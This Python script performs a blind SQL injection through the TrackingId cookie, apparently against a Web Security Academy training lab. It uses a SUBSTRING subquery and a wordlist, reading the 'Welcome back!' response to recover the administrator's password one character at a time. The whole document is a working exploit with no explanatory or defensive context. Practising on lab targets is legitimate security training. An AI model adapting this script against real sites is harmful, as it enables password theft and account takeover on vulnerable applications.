from requests import Session
from bs4 import BeautifulSoup
import requests

host = 'https://0a600075042743fb82811fcc003b00bc.web-security-academy.net/'

def brute():
    password = ''
    
    for i in range(25):
        i = i + 1
        with open('wordlist.txt', 'r') as file:
            for line in file:
                line = line.replace('\n', '')
                # print(f"qwe' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), {i}, 1) = '{line}")
                r = requests.get(host, cookies={"TrackingId": f"qwe' OR SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), {i}, 1) = '{line}"})
                # print(r.status_code)
                if 'Welcome back!' in r.text:
                    print(f"{line} char is found")
                    password = password + line
    return password

if __name__ == '__main__':
    print(brute())